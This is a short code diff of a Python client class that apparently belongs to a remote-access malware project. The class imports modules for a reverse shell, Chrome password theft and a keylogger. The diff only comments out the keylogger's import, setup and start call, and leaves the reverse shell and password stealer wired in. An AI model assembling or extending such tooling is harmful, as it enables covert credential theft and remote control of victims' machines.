@@ -2,7 +2,7 @@ from connection import Connection
 from rev_shell import Shell
 import socket
 from chrome_passwords import ChromePass
-from keylogger import KeyLogger
+# from keylogger import KeyLogger
 
 
 class Client:
@@ -45,7 +45,7 @@ class Client:
         self.chrome_pass = ChromePass(self.chromepass_filename)
 
         # Initialize keylogger instance
-        self.keylogger = KeyLogger(self.keylog_filename)
+        # self.keylogger = KeyLogger(self.keylog_filename)
 
 
     def run(self) -> None:
@@ -61,7 +61,7 @@ class Client:
 
         # --------------------------KEYLOGGER--------------------------#
 
-        self.keylogger.start_log()
+        # self.keylogger.start_log()
 
         # --------------------------REV SHELL--------------------------#
 
